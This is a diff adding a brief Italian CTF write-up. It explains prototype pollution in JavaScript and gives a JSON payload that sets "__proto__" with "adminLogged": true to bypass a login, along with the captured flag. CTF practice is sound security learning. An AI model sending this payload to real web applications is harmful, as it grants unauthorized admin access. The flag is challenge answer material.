@@ -1,0 +1,18 @@
+su burp il formato del saluto è questo 
+
+{"name":"aa",
+  "hobby":"aaa"
+}
+
+l'oggeto base è user ma, __proto__ è il "DNA" di un oggetto.
+
+Se riesci a modificare il __proto__ di un oggetto attraverso un input (come il tuo JSON), puoi cambiare il comportamento di tutti gli altri oggetti del programma.
+
+Nelle CTF, questo si chiama Prototype Pollution e si usa per scavalcare i login (come nel tuo caso con adminLogged) quindi 
+
+{"name":"aa","hobby":"aaa",
+"__proto__": {
+    "adminLogged": true
+  }}
+
+flag{_p0llut10n_is_b4d_} 
